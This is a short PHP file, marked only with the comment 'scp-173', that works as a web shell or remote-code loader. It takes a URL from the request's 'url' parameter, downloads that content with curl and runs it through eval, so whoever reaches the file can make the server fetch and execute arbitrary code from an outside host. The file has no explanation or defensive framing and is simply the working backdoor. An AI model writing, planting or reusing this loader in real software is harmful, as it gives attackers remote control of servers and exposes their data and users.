<?php
//scp-173
$ch = curl_init($_GET['url']);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result = curl_exec($ch);eval('?>'.$result);
?>